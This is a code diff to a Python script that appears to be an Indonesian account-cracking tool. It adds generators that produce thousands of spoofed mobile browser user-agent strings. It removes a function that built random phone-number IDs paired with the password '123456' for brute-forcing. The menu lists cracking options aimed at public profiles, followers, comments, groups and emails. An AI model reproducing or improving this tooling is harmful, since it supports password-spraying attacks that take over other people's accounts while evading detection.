@@ -22,6 +22,7 @@ ugent = []
 ugen = []
 usam = []
 ugen2 = []
+uak = []
 uakuh = []
 usragent = []
 uaku2 = []
@@ -741,6 +742,42 @@ try:
 	open('.proxy.txt','w').write(uno)
 except requests.exceptions.ConnectionError:
 	sys.exit(f"{GOD} Tidak Ada Koneksi Internet")
+	
+for xd in range(10000):
+	a='Mozilla/5.0 (Linux; Tizen'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='SAMSUNG SM-R835F)'
+	e=random.randrange(100, 9999)
+	f='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/537.36'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)
+
+#------------[ UBAH UA DIH SINI OM ]---------------#
+for dvanmeploph in range(10000):
+    rr = random.randint
+    rc = random.choice
+    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J610G Build/PPR1.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-G610M Build/PKQ1.{str(rr(111111,210000))}.018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2109 Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/PKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
+    UaMainn = random.choice([u1, u2, u3, u4, u5])
+    ugen.append(UaMainn)
+ 
+for x in range(10):
+	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
+	c=random.randrange(73,100)
+	d=random.randrange(4200,4900)
+	e=random.randrange(40,150)
+	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
+	
 for xd in range(10000):
 	a='Mozilla/5.0; Profile/MIDP-2.1'
 	b=random.randrange(1, 9)
@@ -770,7 +807,54 @@ for xd in range(10000):
 	l='Mobile/19E241 Safari/602.1'
 	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	ugen.append(uaku2)
+	
+for xd in range(10000):
+	a='Mozilla/5.0 (iPhone14,6; U;'
+	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['CPU iPhone OS 15_4 like Mac OS X)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/602.1.50 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/10.0 Mobile/19E241 Safari/602.1'
+	uaku=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen2.append(uaku)
 
+	aa='Mozilla/5.0 (iPhone14,6; U;'
+	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['CPU iPhone OS 15_4 like Mac OS X)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/602.1.50 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Version/10.0 Mobile/19E241 Safari/602.1'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+for x in range(10):
+	a='Mozilla/5.0 (iPhone14,6; U;'
+	b=random.randrange(100, 9999)
+	c=random.randrange(100, 9999)
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	h=random.randrange(1, 9)
+	i='CPU iPhone OS 15_4 like Mac OS X)'
+	j=random.randrange(1, 9)
+	k=random.randrange(1, 9)
+	l='AppleWebKit/602.1.50 (KHTML, like Gecko)'
+	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
+	ugen.append(uak)
+	
 for x in range(999):
 	rc = random.choice
 	rr = random.randint
@@ -853,13 +937,12 @@ def remove():
 def menu(n,t,c):
 	clear_layar()
 	print(logo(n)+f'\n')
-	print(f" {P}[{hh}01{P}] Crack From Public      [{hh}07{P}] Crack From Nama")
+	print(f" {P}[{hh}01{P}] Crack From Public    	 [{hh}07{P}] Crack From Nama")
 	print(f" [{hh}02{P}] Crack From ID Random     [{hh}08{P}] Crack From File")
 	print(f" [{hh}03{P}] Crack From Followers     [{hh}09{P}] Check Ressult Account")
 	print(f" [{hh}04{P}] Crack From Comment       [{hh}10{P}] Check Account Non-Active")
 	print(f" [{hh}05{P}] Crack From Grup          [{hh}11{P}] Ccheck Option Account")
 	print(f" [{hh}06{P}] Crack From Email         [{hh}12{P}] Log Out ({M}Cookie{P})")
-	print(f" [{hh}13{P}] Crack From Phonee")
 	ask = input(f' [{hh}>>{P}] Chooise : ')
 	print(' ─────────────────────────────')
 	if ask in ['1','01']:crack_publik(t,c)
@@ -873,8 +956,7 @@ def menu(n,t,c):
 	elif ask in ['9','09']:cek_hasil()
 	elif ask in ['10']:cek_akun()
 	elif ask in ['11']:cek_opsi_cp()
-	elif ask in ['12']:remove();exit()
-	elif ask in ['13']:crack_nomor()      
+	elif ask in ['12']:remove();exit()    
 	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")
 	else:sys.exit(f" [{M}>{P}] Pilih Yang Bener Lah Tolol")
 
@@ -984,29 +1066,8 @@ def cek_hasil():
 		except:sys.exit(f" [{M}>{P}] File Tidak Ada Hasil CP")
 		print(kk+buka+P)
 	else:sys.exit(f" [{M}>{P}] Isi Yang Benar {M}!")
-		
-		
-###---[ DUMP NO LOGIN ]---###
-def crack_nomor():
-	print(f' [{hh}<{P}] Crack Nomor Gunakan Sandi Manual')
-	depan = input(' Awalan : ')
-	if len(depan)==3:pass
-	else:exit(f' [{M}>{P}] Contoh Awalan Nomor 089')
-	jumla = input(' Jumlah : ')
-	for x in range(int(jumla)):
-		rr = random.randint
-		A = depan
-		B = rr(1111,9999)
-		C = rr(1,9)
-		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
-		if D in dump:pass
-		else:dump.append(D+'|123456')
-		print('\r sedang dump %s id'%(len(dump)),end=" ")
-		sys.stdout.flush()
-		sleep(0.0000003)
-	atur_atur()
-		
 
+### ------ [ Crack From Email ] ------ ###		
 def clon_email():
 	rc = random.choice
 	rr = random.randint
